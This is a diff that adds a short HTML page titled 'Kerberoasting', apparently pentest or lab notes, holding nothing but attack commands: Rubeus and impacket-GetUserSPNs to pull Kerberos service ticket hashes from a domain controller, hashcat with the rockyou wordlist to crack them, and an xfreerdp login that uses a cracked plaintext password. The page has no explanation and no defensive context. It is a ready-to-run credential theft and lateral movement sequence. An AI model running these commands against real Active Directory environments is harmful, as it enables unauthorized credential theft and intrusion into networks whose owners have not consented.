@@ -1,0 +1,14 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Kerberoasting</title>
+</head><body>.\Rubeus.exe kerberoast /outfile:hashes.kerberoast<br/>
+<br/>
+sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force<br/>
+<br/>
+sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete<br/>
+<br/>
+xfreerdp /u:backupuser /p:DonovanJadeKnight1 /cert:ignore /v:192.168.233.70<br/>
+<br/>
+</body></html>
